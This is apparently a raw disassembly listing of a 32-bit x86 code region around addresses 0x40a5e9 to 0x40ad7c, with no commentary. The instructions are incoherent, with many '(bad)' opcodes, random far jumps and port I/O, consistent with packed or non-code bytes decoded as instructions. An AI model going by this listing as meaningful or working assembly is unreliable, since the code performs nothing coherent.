  40a5e9:	arpl   WORD PTR [esi+eax*8+0x5b35c833],ax
  40a5f0:	stos   DWORD PTR es:[edi],eax
  40a5f1:	adc    al,0x9f
  40a5f3:	ja     0x40a5dc
  40a5f5:	dec    ebp
  40a5f6:	xor    ecx,edi
  40a5f8:	cwde   
  40a5f9:	ret    
  40a5fa:	fcom   DWORD PTR [ebp+0x688e85]
  40a600:	mov    esi,0xd1a0e1b1
  40a605:	bound  ecx,QWORD PTR [edx+0x1455bdb3]
  40a60b:	out    0xaf,eax
  40a60d:	pop    esp
  40a60e:	jmp    0xa9ed3bd0
  40a613:	je     0x40a59d
  40a615:	stc    
  40a616:	sbb    ebp,DWORD PTR [ebx-0x71aaef0d]
  40a61c:	pop    es
  40a61d:	sub    DWORD PTR [eax],ebp
  40a61f:	sbb    al,0x2e
  40a621:	retf   
  40a622:	pushf  
  40a623:	ins    DWORD PTR es:[edi],dx
  40a624:	mov    ?,WORD PTR [ebp-0x600cadf3]
  40a62a:	ds xchg esi,eax
  40a62c:	inc    ebx
  40a62d:	cli    
  40a62e:	adc    cl,cl
  40a630:	inc    edx
  40a631:	sub    eax,0xc48c1edd
  40a636:	loope  0x40a5b9
  40a638:	xor    eax,0x7379b021
  40a63d:	or     BYTE PTR [edi+0x3f],dh
  40a640:	dec    ecx
  40a641:	xor    al,0xac
  40a643:	xor    al,0x51
  40a645:	adc    al,0x89
  40a647:	adc    DWORD PTR [esi-0x18],ebp
  40a64a:	mov    ebx,0x9100c683
  40a64f:	push   ecx
  40a650:	mov    esi,0x16286d61
  40a655:	movaps XMMWORD PTR gs:[ecx],xmm6
  40a659:	lods   al,BYTE PTR ds:[esi]
  40a65a:	das    
  40a65b:	je     0x40a611
  40a65d:	sub    dl,ch
  40a65f:	ror    DWORD PTR [edi],cl
  40a661:	mov    BYTE PTR ds:0x78094c04,dl
  40a667:	mov    DWORD PTR [eax+0x5a],edx
  40a66a:	sahf   
  40a66b:	pop    edi
  40a66c:	adc    al,0x5e
  40a66e:	loopne 0x40a678
  40a670:	aaa    
  40a671:	test   eax,0xc433800f
  40a676:	jns    0x40a6cc
  40a678:	xchg   cl,dl
  40a67a:	std    
  40a67b:	mov    dl,0x26
  40a67d:	shl    BYTE PTR [esi-0x2c],1
  40a680:	mov    ch,bh
  40a682:	pop    ss
  40a683:	sti    
  40a684:	xchg   esp,eax
  40a685:	xor    eax,0x9f80871f
  40a68a:	xchg   esi,eax
  40a68b:	dec    edi
  40a68c:	mov    ebp,0x24996795
  40a691:	neg    DWORD PTR [esp+0x76]
  40a695:	adc    DWORD PTR [edi+0x59],ebp
  40a698:	sahf   
  40a699:	pusha  
  40a69a:	jl     0x40a6bf
  40a69c:	retf   
  40a69d:	and    ebp,DWORD PTR ds:0xf65f4194
  40a6a3:	xor    dh,BYTE PTR [edx]
  40a6a5:	enter  0xa7ba,0x78
  40a6a9:	ret    
  40a6aa:	rcl    ebp,0x3
  40a6ad:	push   ds
  40a6ae:	mov    ds:0x6dcc8222,al
  40a6b3:	sbb    ah,BYTE PTR [ebp-0x71dd061e]
  40a6b9:	add    bh,bh
  40a6bb:	shl    DWORD PTR [esi+ebp*4],1
  40a6be:	and    cl,dl
  40a6c0:	out    0x86,al
  40a6c2:	mov    al,0xec
  40a6c4:	popa   
  40a6c5:	dec    eax
  40a6c6:	lea    edx,[ecx*4-0xfab5438]
  40a6cd:	mov    esi,0x7a4a91b5
  40a6d2:	popa   
  40a6d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6d4:	push   ds
  40a6d5:	jle    0x40a703
  40a6d7:	cs add esp,ecx
  40a6da:	jno    0x40a6d6
  40a6dc:	xor    al,0x1e
  40a6de:	loopne 0x40a75c
  40a6e0:	dec    eax
  40a6e1:	add    bl,BYTE PTR [ebp+0x505ee722]
  40a6e7:	imul   ebp,DWORD PTR [edi+0x4054583c],0xb404ed59
  40a6f1:	inc    esi
  40a6f2:	xchg   ecx,eax
  40a6f3:	in     al,0x43
  40a6f5:	or     ah,ah
  40a6f7:	dec    esi
  40a6f8:	xchg   ecx,eax
  40a6f9:	rol    DWORD PTR [edx],cl
  40a6fb:	sbb    al,0xac
  40a6fd:	jmp    0xd2e:0x769ec8f4
  40a704:	jmp    0xbc77db8e
  40a709:	arpl   WORD PTR [esi-0x11],ax
  40a70c:	lods   eax,DWORD PTR ds:[esi]
  40a70d:	fstp   TBYTE PTR [edx+0x5659269d]
  40a713:	mov    dh,0xef
  40a716:	jmp    0x2b255d88
  40a71b:	loopne 0x40a727
  40a71d:	xchg   esp,eax
  40a71e:	xor    esp,DWORD PTR [eax+esi*4+0x1d65a678]
  40a725:	or     DWORD PTR [eax],0x328a8b8f
  40a72b:	enter  0xc293,0xb4
  40a72f:	add    bl,0xce
  40a732:	mov    ch,0xac
  40a734:	or     edx,DWORD PTR [esi]
  40a736:	icebp  
  40a737:	shl    DWORD PTR [ecx+0x1e],cl
  40a73a:	loop   0x40a737
  40a73c:	xor    DWORD PTR [esi+0x79],ecx
  40a73f:	dec    ebx
  40a740:	mov    esp,0x50a78cd1
  40a745:	sbb    eax,0x67df3060
  40a74a:	mov    ss,WORD PTR [edi+ebx*1+0x7d]
  40a74e:	scas   eax,DWORD PTR es:[edi]
  40a74f:	jae    0x40a6ea
  40a751:	dec    eax
  40a752:	mov    gs,WORD PTR [ebx+0x735af1a2]
  40a758:	xchg   ebp,eax
  40a759:	dec    esp
  40a75a:	in     eax,0xbe
  40a75c:	adc    DWORD PTR [ecx+eax*4],ebx
  40a75f:	add    al,0xea
  40a761:	jp     0x40a71e
  40a763:	stos   DWORD PTR es:[edi],eax
  40a764:	or     dl,BYTE PTR [ebp+0x7d180f3b]
  40a76a:	div    BYTE PTR [ebx-0xb]
  40a76d:	sub    BYTE PTR [ebp+0x54],bl
  40a770:	(bad)  
  40a771:	pop    eax
  40a772:	vshufps xmm6,xmm3,XMMWORD PTR [esi-0x78b743eb],0x75
  40a77b:	push   es
  40a77c:	and    eax,0x946c6049
  40a781:	cli    
  40a782:	shr    BYTE PTR [esi-0x6040729c],0x59
  40a789:	xchg   ebx,eax
  40a78a:	stos   BYTE PTR es:[edi],al
  40a78b:	jmp    0xa467:0x4d223424
  40a792:	adc    BYTE PTR [edi+eiz*8],cl
  40a795:	mov    ds:0x2b390dc6,eax
  40a79a:	bound  ebx,QWORD PTR [eax-0x45]
  40a79d:	mov    ch,0x22
  40a79f:	jmp    0x40a7b8
  40a7a1:	push   0xfffffff2
  40a7a3:	cld    
  40a7a4:	dec    esi
  40a7a5:	and    eax,0x4fa3aeae
  40a7aa:	jbe    0x40a7f7
  40a7ac:	mov    al,0xcb
  40a7ae:	iret   
  40a7af:	jae    0x40a742
  40a7b1:	sbb    DWORD PTR [edi],esp
  40a7b3:	loop   0x40a7d4
  40a7b5:	retf   0x3d31
  40a7b8:	jb     0x40a7a0
  40a7ba:	push   esi
  40a7bb:	push   0x272bfcbb
  40a7c0:	cmp    BYTE PTR [ebx],ah
  40a7c2:	jnp    0x40a74f
  40a7c4:	arpl   sp,dx
  40a7c6:	sub    BYTE PTR [eax+ebp*2-0x73],bh
  40a7ca:	stos   DWORD PTR es:[edi],eax
  40a7cb:	(bad)  
  40a7cd:	(bad)  
  40a7ce:	jp     0x40a7cf
  40a7d0:	xchg   ebx,eax
  40a7d1:	add    al,0xb9
  40a7d3:	push   esi
  40a7d4:	jnp    0x40a81f
  40a7d6:	hlt    
  40a7d7:	add    esp,esi
  40a7d9:	mov    dl,0x9
  40a7db:	lahf   
  40a7dc:	test   DWORD PTR [edx+ebp*8-0x1],edx
  40a7e0:	es dec ecx
  40a7e2:	cmp    al,0x46
  40a7e4:	pop    ds
  40a7e5:	mov    dl,0x93
  40a7e7:	mov    dl,0x4a
  40a7e9:	jmp    0x40a7fb
  40a7eb:	mov    bl,0xa8
  40a7ed:	das    
  40a7ee:	popf   
  40a7ef:	jmp    0x8eb1:0x9be5a2ce
  40a7f6:	shr    BYTE PTR [ebx],0x74
  40a7f9:	xor    bh,dl
  40a7fb:	add    bh,BYTE PTR [edi+ebx*8+0x7b]
  40a7ff:	pop    ecx
  40a800:	mov    cl,al
  40a802:	loop   0x40a881
  40a804:	in     eax,dx
  40a805:	outs   dx,DWORD PTR ds:[si]
  40a807:	jecxz  0x40a7c8
  40a809:	mov    dh,0xba
  40a80b:	int3   
  40a80c:	pop    esp
  40a80d:	sbb    eax,0x3e7e53a0
  40a812:	push   es
  40a813:	pop    ds
  40a814:	sbb    al,0x68
  40a816:	mov    WORD PTR [esi],gs
  40a818:	daa    
  40a819:	xor    eax,0x5151dcf7
  40a81e:	xor    esp,0x24
  40a821:	jnp    0x40a809
  40a823:	xchg   DWORD PTR [esi-0x3a434a41],ebx
  40a829:	mov    cl,0x1
  40a82b:	sub    cl,BYTE PTR [esi+0x38652a2d]
  40a831:	mov    edi,DWORD PTR [ebx+0x50]
  40a834:	adc    ebx,ecx
  40a836:	das    
  40a837:	aam    0x9d
  40a839:	push   ds
  40a83a:	rcl    edx,cl
  40a83c:	into   
  40a83d:	jne    0x40a806
  40a83f:	dec    eax
  40a840:	loope  0x40a890
  40a842:	jmp    0xdc3a:0x451a33d5
  40a849:	loop   0x40a836
  40a84b:	shl    DWORD PTR [esi-0x5548babb],1
  40a851:	mov    ds:0xcb19c7a9,eax
  40a856:	adc    esp,DWORD PTR [ecx+0x42]
  40a859:	jg     0x40a867
  40a85b:	cmp    DWORD PTR [edx+0x51df1dc6],edx
  40a861:	ficomp DWORD PTR [edx]
  40a863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a864:	int    0xed
  40a866:	push   esi
  40a867:	hlt    
  40a868:	cmp    bl,BYTE PTR [ecx-0xe]
  40a86b:	shl    BYTE PTR [ebx-0x5bcf1099],0x5a
  40a872:	(bad)  
  40a873:	push   ebx
  40a874:	pop    esp
  40a875:	and    BYTE PTR fs:0x59f4a478,al
  40a87c:	dec    esp
  40a87d:	sbb    DWORD PTR [ecx+0x53b8c1c],esi
  40a883:	loope  0x40a830
  40a885:	(bad)  
  40a886:	adc    ecx,DWORD PTR [edi]
  40a888:	repz pop ecx
  40a88a:	add    cl,BYTE PTR [eax]
  40a88c:	ret    
  40a88d:	jp     0x40a850
  40a88f:	mov    ecx,0x74ed3351
  40a894:	mov    bl,0xaa
  40a896:	and    al,0x3c
  40a898:	xor    BYTE PTR [ebp+0x46ae7d68],al
  40a89e:	dec    esp
  40a89f:	jnp    0x40a82d
  40a8a1:	xor    edx,0xcced2536
  40a8a7:	sub    ecx,DWORD PTR [edi]
  40a8a9:	mov    bh,0x12
  40a8ab:	add    dh,0x3c
  40a8ae:	pushf  
  40a8af:	xor    bl,dl
  40a8b1:	popa   
  40a8b2:	stos   DWORD PTR es:[edi],eax
  40a8b3:	and    al,0x33
  40a8b5:	fwait
  40a8b6:	mov    cl,0x8d
  40a8b8:	out    dx,eax
  40a8b9:	dec    ch
  40a8bb:	jnp    0x40a8e3
  40a8bd:	jmp    DWORD PTR [edi+0x38]
  40a8c0:	std    
  40a8c1:	jmp    0xd1b9:0x1e575092
  40a8c8:	xchg   edi,eax
  40a8c9:	pop    edi
  40a8ca:	lds    edx,FWORD PTR [edi-0x6a]
  40a8cd:	sbb    edi,DWORD PTR [eax-0x7a9d15b2]
  40a8d3:	mov    cl,0x36
  40a8d5:	or     DWORD PTR [ecx+0x601536cd],eax
  40a8db:	add    al,0xd1
  40a8dd:	cmp    edx,DWORD PTR [esi]
  40a8df:	cmp    DWORD PTR [ecx],esp
  40a8e1:	push   ebp
  40a8e2:	or     ah,ah
  40a8e4:	mov    eax,ds:0x10c7e2b6
  40a8e9:	in     al,0xac
  40a8eb:	enter  0x81ba,0x70
  40a8ef:	sub    edi,edi
  40a8f1:	fsub   st(7),st
  40a8f3:	jecxz  0x40a8af
  40a8f5:	pop    ebp
  40a8f6:	es cli 
  40a8f8:	and    BYTE PTR [esi-0x23],dh
  40a8fb:	sbb    al,0x6b
  40a8fd:	jmp    0x75755fec
  40a902:	stos   BYTE PTR es:[edi],al
  40a903:	mov    dh,0x5c
  40a905:	dec    edx
  40a906:	jl     0x40a984
  40a908:	loopne 0x40a920
  40a90a:	jg     0x40a8be
  40a90c:	cmp    BYTE PTR [eax],0xca
  40a90f:	pop    ecx
  40a910:	nop
  40a911:	sbb    al,0x13
  40a913:	or     BYTE PTR [ebp+edi*1-0x36515caa],bl
  40a91a:	push   edi
  40a91b:	mov    dl,0xb9
  40a91d:	adc    BYTE PTR [esi+0x43],cl
  40a920:	(bad)  
  40a921:	std    
  40a922:	cmp    DWORD PTR [ebx+0x79],edx
  40a925:	cmp    ah,BYTE PTR [edx]
  40a927:	jg     0x40a8db
  40a929:	cmovp  edi,DWORD PTR [esi-0x2a]
  40a92d:	pop    es
  40a92e:	pusha  
  40a92f:	cmp    eax,0x6b596173
  40a934:	sub    eax,0x5d13afe3
  40a939:	add    cl,BYTE PTR [edi-0x64c1c41a]
  40a93f:	call   0x9ad8:0x827802b8
  40a946:	pusha  
  40a947:	xor    dl,BYTE PTR [esi+0x434e529b]
  40a94d:	retf   
  40a94e:	rcl    DWORD PTR [edx-0x5b2d0299],0x20
  40a955:	sbb    BYTE PTR [eax+eiz*4+0xe],cl
  40a959:	jmp    0xcce4:0xb8551a6d
  40a960:	fistp  DWORD PTR [edx-0x5f]
  40a963:	jnp    0x40a90c
  40a965:	push   ebp
  40a966:	mov    bl,0xf4
  40a968:	xor    ebp,DWORD PTR [esi]
  40a96a:	xchg   esi,eax
  40a96b:	sub    al,0x28
  40a96d:	int    0xd9
  40a96f:	xchg   DWORD PTR ds:0xadd477fc,edx
  40a975:	je     0x40a8ff
  40a977:	test   DWORD PTR [ebx],0xea901642
  40a97d:	mov    edx,esi
  40a97f:	mov    dl,0x74
  40a981:	push   eax
  40a982:	cmp    esp,edi
  40a984:	sbb    DWORD PTR [edx-0xa],ebx
  40a987:	lock and eax,0xbb98148a
  40a98d:	jbe    0x40a9cc
  40a98f:	sub    al,0xfa
  40a991:	mov    eax,ds:0x3cdad528
  40a996:	mov    DWORD PTR [ecx],0x9adbfb19
  40a99c:	mov    eax,ds:0x92917e73
  40a9a1:	(bad)  
  40a9a2:	loope  0x40a964
  40a9a4:	lahf   
  40a9a5:	mov    ds:0xea02cfbd,ax
  40a9ab:	inc    edi
  40a9ac:	jbe    0x40a997
  40a9ae:	mov    ds:0xfef3edc,al
  40a9b3:	(bad)  
  40a9b5:	mov    ch,0x33
  40a9b7:	cmp    eax,0x8111bca7
  40a9bc:	pop    edx
  40a9bd:	push   ecx
  40a9be:	push   0x9f112130
  40a9c3:	(bad)  
  40a9c4:	jecxz  0x40a976
  40a9c6:	sbb    al,0x5c
  40a9c8:	arpl   WORD PTR [edx+ecx*1+0x826e50a],dx
  40a9cf:	rcl    DWORD PTR [ecx],0x11
  40a9d2:	(bad)  
  40a9d3:	iret   
  40a9d4:	jo     0x40aa1b
  40a9d6:	and    ebp,DWORD PTR [esp+esi*4]
  40a9d9:	cmp    esi,DWORD PTR [edx]
  40a9db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9dc:	mov    edx,0x7aeb3e3c
  40a9e1:	pop    ds
  40a9e2:	and    eax,0x2fba2d56
  40a9e7:	enter  0xfc99,0x2c
  40a9eb:	or     DWORD PTR [esi-0x303c5683],edi
  40a9f1:	pop    esi
  40a9f3:	mov    edi,0xee70ba0f
  40a9f8:	xor    al,0xb7
  40a9fa:	dec    esi
  40a9fb:	add    bh,BYTE PTR [edx]
  40a9fd:	les    edx,FWORD PTR [ecx+0x2f]
  40aa00:	add    edi,DWORD PTR [esi-0x6d854512]
  40aa06:	fst    QWORD PTR [edi]
  40aa08:	das    
  40aa09:	xor    BYTE PTR [ebx+0x7377868],bl
  40aa0f:	pop    ecx
  40aa10:	pop    es
  40aa11:	jge    0x40aa0e
  40aa13:	inc    ebx
  40aa14:	add    BYTE PTR [eax-0x3d9c5e15],ch
  40aa1a:	data16 or al,0x6a
  40aa1d:	inc    ecx
  40aa1e:	jp     0x40aa5e
  40aa20:	lock imul DWORD PTR [ebp-0x4d32d481]
  40aa27:	imul   esp,DWORD PTR [eax],0x34
  40aa2a:	ret    0x7aba
  40aa2d:	call   0xbc32c642
  40aa32:	cmp    eax,0x408fb49a
  40aa37:	in     eax,0x1d
  40aa39:	call   0xd5cba371
  40aa3e:	aam    0xc3
  40aa40:	js     0x40aaae
  40aa42:	xchg   esp,eax
  40aa43:	repz adc ebp,edx
  40aa46:	aas    
  40aa47:	(bad)  
  40aa49:	jae    0x40aa8a
  40aa4b:	fucom  st(7)
  40aa4d:	sub    cl,ah
  40aa4f:	pop    ecx
  40aa50:	aad    0x4a
  40aa52:	jno    0x40a9fb
  40aa54:	jmp    0x40a9df
  40aa56:	push   ecx
  40aa57:	scas   al,BYTE PTR es:[edi]
  40aa58:	push   0x1b1e4abe
  40aa5d:	mov    bh,0x83
  40aa5f:	xor    al,0x6c
  40aa61:	std    
  40aa62:	inc    eax
  40aa63:	ja     0x40aa32
  40aa65:	out    0x48,eax
  40aa67:	jb     0x40aae8
  40aa69:	loop   0x40aa79
  40aa6b:	sbb    BYTE PTR [ebx],bh
  40aa6d:	adc    DWORD PTR [edi+ebp*1],0x6cd4abe3
  40aa74:	in     eax,0x98
  40aa76:	neg    DWORD PTR [ecx]
  40aa78:	pop    edx
  40aa79:	stos   DWORD PTR es:[edi],eax
  40aa7a:	xchg   ebp,eax
  40aa7b:	sub    DWORD PTR [ecx],edi
  40aa7d:	jecxz  0x40aac6
  40aa7f:	mov    WORD PTR [ecx],?
  40aa81:	(bad)  
  40aa82:	inc    ecx
  40aa83:	(bad)  
  40aa84:	cmc    
  40aa85:	mov    eax,ds:0x7074c308
  40aa8a:	sbb    BYTE PTR [eax-0x1f],cl
  40aa8d:	mov    DWORD PTR [esi],ebp
  40aa8f:	push   cs
  40aa90:	out    0x20,eax
  40aa92:	ds and al,0xdb
  40aa95:	stos   DWORD PTR es:[edi],eax
  40aa96:	mov    bl,0xd5
  40aa98:	adc    al,0x38
  40aa9a:	mov    cl,0x7
  40aa9c:	(bad)  
  40aa9d:	sti    
  40aa9e:	mov    dl,0x68
  40aaa0:	dec    esi
  40aaa1:	sub    BYTE PTR fs:[edx+0xf7843e7],cl
  40aaa8:	pop    es
  40aaa9:	retf   
  40aaaa:	mov    ah,BYTE PTR [ebx]
  40aaac:	test   DWORD PTR [edi],0xd203a538
  40aab2:	pusha  
  40aab3:	pop    ds
  40aab4:	mov    al,ds:0x1d9b937a
  40aab9:	sbb    eax,0x91547f47
  40aabe:	inc    edi
  40aabf:	adc    eax,DWORD PTR [ebx-0x33]
  40aac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aac3:	adc    ebp,edi
  40aac5:	fwait
  40aac6:	mov    cl,0x9e
  40aac8:	xor    DWORD PTR [edi+0x37],ebp
  40aacb:	ja     0x40aa8b
  40aacd:	adc    DWORD PTR [esi-0x592c9586],0x3fffc0b6
  40aad7:	sub    al,cl
  40aad9:	aas    
  40aada:	pop    ecx
  40aadb:	adc    BYTE PTR [ecx+0x4cc098cc],0xa0
  40aae2:	jle    0x40aaaa
  40aae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aae5:	shl    BYTE PTR [ecx-0x1dfbc2d2],1
  40aaeb:	cwde   
  40aaec:	int    0x94
  40aaee:	out    0x33,al
  40aaf0:	dec    ecx
  40aaf1:	push   edx
  40aaf2:	pop    edx
  40aaf3:	das    
  40aaf4:	xor    dl,BYTE PTR [esp+0x86e64f7]
  40aafb:	mov    dh,0x66
  40aafd:	inc    ecx
  40aafe:	mov    ecx,0x3bcc4464
  40ab03:	jmp    0x40aade
  40ab05:	xor    al,0x51
  40ab07:	push   esp
  40ab08:	jmp    0xb642e571
  40ab0d:	sbb    BYTE PTR [ebp-0x43],0xcc
  40ab11:	mov    ds:0xf34e3af2,eax
  40ab16:	mov    al,ds:0x23abe3e1
  40ab1b:	and    BYTE PTR [eax],0x94
  40ab1e:	sub    ebp,DWORD PTR [ebx+0x53]
  40ab21:	mov    ecx,0xb7b981da
  40ab26:	loopne 0x40ab50
  40ab28:	cld    
  40ab29:	cld    
  40ab2a:	adc    esi,DWORD PTR [eax]
  40ab2c:	cdq    
  40ab2d:	pusha  
  40ab2e:	mov    dl,0x37
  40ab30:	push   0xffffffa9
  40ab32:	or     ah,BYTE PTR [ecx+0x41]
  40ab35:	repz repz adc al,0xe6
  40ab39:	inc    edi
  40ab3a:	pop    eax
  40ab3b:	pop    es
  40ab3c:	mov    dl,BYTE PTR [ebp+0x43]
  40ab3f:	lock es cld 
  40ab42:	push   0xffffffea
  40ab44:	stc    
  40ab45:	pushw  es
  40ab47:	cmp    al,0x4b
  40ab49:	dec    edi
  40ab4a:	dec    ecx
  40ab4b:	push   esp
  40ab4c:	mov    ah,0x29
  40ab4e:	shr    BYTE PTR [ebp-0x10],0x82
  40ab52:	enter  0xd31c,0x3
  40ab56:	stos   DWORD PTR es:[edi],eax
  40ab57:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40ab59:	mov    bh,0xc5
  40ab5b:	call   DWORD PTR [edi-0x4270d3d7]
  40ab61:	loopne 0x40ab43
  40ab63:	cli    
  40ab64:	xor    eax,0x1217c58
  40ab69:	jp     0x40abc9
  40ab6b:	lea    esp,[ebx-0x317f420c]
  40ab71:	cld    
  40ab72:	fs dec ecx
  40ab74:	mov    eax,0xd9b6754e
  40ab79:	lods   eax,DWORD PTR ds:[esi]
  40ab7a:	neg    ecx
  40ab7c:	xchg   edi,eax
  40ab7d:	in     eax,0xc9
  40ab7f:	aam    0x31
  40ab81:	inc    esp
  40ab82:	xchg   BYTE PTR ds:0xd2758a21,bh
  40ab88:	test   DWORD PTR [edx],esi
  40ab8a:	mov    ds,WORD PTR [edi-0x26]
  40ab8d:	xor    DWORD PTR ds:0xf40f0e2a,ebp
  40ab93:	iret   
  40ab94:	sub    BYTE PTR ss:[edx+0x148ad54d],bh
  40ab9b:	(bad)  
  40ab9c:	loopne 0x40ab56
  40ab9e:	jbe    0x40ab4c
  40aba0:	adc    dl,BYTE PTR [edi+0x70]
  40aba3:	jg     0x40ab7c
  40aba5:	call   0x6589:0xcad397f2
  40abac:	mov    BYTE PTR [eax+0x65461a2b],al
  40abb2:	popa   
  40abb3:	or     bl,BYTE PTR [edi+edx*1]
  40abb6:	aad    0x79
  40abb8:	fild   DWORD PTR [ebp-0x4a29cd49]
  40abbe:	sub    BYTE PTR [ecx+0x7b],bh
  40abc1:	call   0x219e9b7b
  40abc6:	jge    0x40ab56
  40abc8:	js     0x40abca
  40abca:	cli    
  40abcb:	js     0x40abbb
  40abcd:	in     eax,dx
  40abce:	pop    esp
  40abcf:	aam    0xcf
  40abd1:	gs xchg ebx,eax
  40abd3:	std    
  40abd4:	test   eax,0x5b50e9f4
  40abd9:	jmp    0x40aba4
  40abdb:	mul    DWORD PTR [ecx+0x26]
  40abde:	mov    bl,0xb3
  40abe0:	sub    BYTE PTR [edx],0xd4
  40abe3:	jnp    0x40abb0
  40abe5:	jae    0x40abb8
  40abe7:	xor    bl,BYTE PTR [ebx]
  40abe9:	inc    edi
  40abea:	in     al,0x5
  40abec:	xor    eax,esp
  40abee:	rcr    BYTE PTR [ecx-0x61],0x75
  40abf2:	jbe    0x40ab9f
  40abf4:	mov    ah,BYTE PTR [edx+0x35]
  40abf7:	aam    0xd
  40abf9:	pop    eax
  40abfa:	or     ecx,DWORD PTR [ecx]
  40abfc:	stos   DWORD PTR es:[edi],eax
  40abfd:	clc    
  40abfe:	sbb    esp,DWORD PTR [esi]
  40ac00:	in     eax,dx
  40ac01:	aam    0xe7
  40ac03:	inc    ebp
  40ac04:	jnp    0x40ac7f
  40ac06:	cmc    
  40ac07:	xor    al,0x20
  40ac09:	add    BYTE PTR [edi+0x32],0xf2
  40ac0d:	enter  0xc1f8,0x4f
  40ac11:	sbb    bh,BYTE PTR [eax]
  40ac13:	xchg   ebx,eax
  40ac14:	and    BYTE PTR [ebx-0x52],al
  40ac17:	pop    ebx
  40ac18:	mov    cl,dl
  40ac1a:	push   ebx
  40ac1b:	xchg   BYTE PTR [ecx-0x38],bl
  40ac1e:	cmovb  edi,DWORD PTR [edx]
  40ac21:	push   esi
  40ac22:	xor    BYTE PTR [ebp+0x4],dh
  40ac25:	or     al,0x8c
  40ac27:	pop    ecx
  40ac28:	inc    ebp
  40ac29:	popf   
  40ac2a:	sbb    edi,DWORD PTR [ecx]
  40ac2c:	nop
  40ac2d:	rcr    DWORD PTR [edx+0x6f4ea2ee],cl
  40ac33:	or     al,0x3d
  40ac35:	(bad)  
  40ac36:	stc    
  40ac37:	mov    gs,WORD PTR fs:[edx+0x5441aa98]
  40ac3e:	sti    
  40ac3f:	test   eax,0x83a3a8ad
  40ac44:	mov    esi,0x66ec0ea1
  40ac49:	mov    edx,edx
  40ac4b:	mov    edi,0x27c04cfa
  40ac50:	dec    esp
  40ac51:	dec    esi
  40ac52:	jnp    0x40acac
  40ac54:	ret    0xcc84
  40ac57:	das    
  40ac58:	sbb    esp,ecx
  40ac5a:	and    al,0x60
  40ac5c:	sub    BYTE PTR [esi],0xbb
  40ac5f:	and    ecx,DWORD PTR [ebx]
  40ac61:	test   DWORD PTR [eax],esp
  40ac63:	push   ecx
  40ac64:	mov    ah,0x43
  40ac66:	cs jl  0x40ac56
  40ac69:	inc    edi
  40ac6a:	(bad)  
  40ac6b:	call   0x5069:0x50cfa8bf
  40ac72:	into   
  40ac73:	fcmovbe st,st(0)
  40ac75:	dec    ecx
  40ac76:	into   
  40ac77:	fidivr DWORD PTR [edx+ebp*1+0x7e]
  40ac7b:	jns    0x40acfa
  40ac7d:	aad    0x44
  40ac7f:	int3   
  40ac80:	or     eax,edx
  40ac82:	(bad)  
  40ac83:	call   0xea88dba1
  40ac88:	add    eax,0x4310328b
  40ac8d:	lods   al,BYTE PTR ds:[esi]
  40ac8e:	std    
  40ac8f:	add    edi,esi
  40ac91:	push   edx
  40ac92:	bound  eax,QWORD PTR [ebx+0x34296a6b]
  40ac98:	push   ebp
  40ac99:	cli    
  40ac9a:	mov    ds:0x1357ee1b,eax
  40ac9f:	inc    ebp
  40aca0:	and    BYTE PTR [ecx+0x21],dh
  40aca3:	pop    ecx
  40aca4:	mov    ch,0xad
  40aca6:	or     cl,cl
  40aca8:	add    al,BYTE PTR [eax+ebp*1+0x13d2ba35]
  40acaf:	cmp    DWORD PTR [ebx+0x1e8863d7],ebx
  40acb5:	jge    0x40ac66
  40acb7:	retf   0xe1b0
  40acba:	cmp    eax,0x248f5d59
  40acbf:	mov    ebx,cs
  40acc1:	pop    es
  40acc2:	xor    BYTE PTR [edx-0x3f06bf33],dh
  40acc8:	loopne 0x40acc3
  40acca:	out    0x53,al
  40accc:	mov    dl,0xe4
  40acce:	std    
  40accf:	ds jmp 0xb257:0x87bd58a9
  40acd7:	and    ebx,0x4
  40acda:	dec    esp
  40acdb:	add    ch,BYTE PTR [eax+0x1e]
  40acde:	inc    ebx
  40acdf:	sub    al,0x15
  40ace1:	repz cli 
  40ace3:	sbb    eax,esp
  40ace5:	pop    edi
  40ace6:	mov    esi,es
  40ace8:	jae    0x40acb4
  40acea:	ret    
  40aceb:	and    eax,0x3fd36a88
  40acf0:	es mov esi,0x469b9b06
  40acf6:	inc    esi
  40acf7:	loope  0x40ac9c
  40acf9:	out    dx,eax
  40acfa:	jecxz  0x40ac83
  40acfc:	push   eax
  40acfd:	sahf   
  40acfe:	loop   0x40aca6
  40ad00:	scas   al,BYTE PTR es:[edi]
  40ad01:	dec    edi
  40ad02:	sub    ah,BYTE PTR [ecx]
  40ad04:	stos   DWORD PTR es:[edi],eax
  40ad05:	pop    ecx
  40ad06:	ja     0x40acf9
  40ad08:	cld    
  40ad09:	dec    edx
  40ad0a:	cmc    
  40ad0b:	retf   0x108
  40ad0e:	pop    ebx
  40ad0f:	repz mov bh,ch
  40ad12:	mov    ebp,0x86973471
  40ad17:	(bad)  
  40ad18:	add    ebp,edi
  40ad1a:	pop    es
  40ad1b:	jbe    0x40acbd
  40ad1d:	mov    WORD PTR [eax],gs
  40ad1f:	aam    0xcb
  40ad21:	dec    esp
  40ad22:	into   
  40ad23:	add    edi,DWORD PTR [ebx+ebp*1-0x18c8e28e]
  40ad2a:	sti    
  40ad2b:	mov    ebx,0xb406be5d
  40ad30:	pop    ss
  40ad31:	fdivrp st(5),st
  40ad33:	jbe    0x40ad76
  40ad35:	push   ds
  40ad36:	sbb    eax,0xd255d2c0
  40ad3b:	lods   eax,DWORD PTR ds:[esi]
  40ad3c:	ss push esp
  40ad3e:	arpl   WORD PTR [eax],ax
  40ad40:	push   es
  40ad41:	stc    
  40ad42:	sub    eax,0x2d0295a1
  40ad47:	pop    esp
  40ad48:	ja     0x40adb5
  40ad4a:	scas   al,BYTE PTR es:[edi]
  40ad4b:	mov    edi,0xa3e52a93
  40ad50:	ror    DWORD PTR [ecx+0x3],1
  40ad53:	adc    eax,0x892cd3a4
  40ad58:	into   
  40ad59:	and    eax,0x9444e55b
  40ad5e:	adc    al,0x19
  40ad60:	ret    
  40ad61:	xchg   edi,eax
  40ad62:	cmp    BYTE PTR [ebp+0x31],ah
  40ad65:	cmp    ah,BYTE PTR [ebx+0x39d32501]
  40ad6b:	lea    ecx,ds:0x6f0763c5
  40ad71:	sub    al,0xaa
  40ad73:	mov    DWORD PTR [eax],ebx
  40ad75:	out    dx,eax
  40ad76:	data16 cmc 
  40ad78:	xchg   ebx,eax
  40ad79:	pushf  
  40ad7a:	add    esp,ecx
  40ad7c:	jae    0x40ad9a
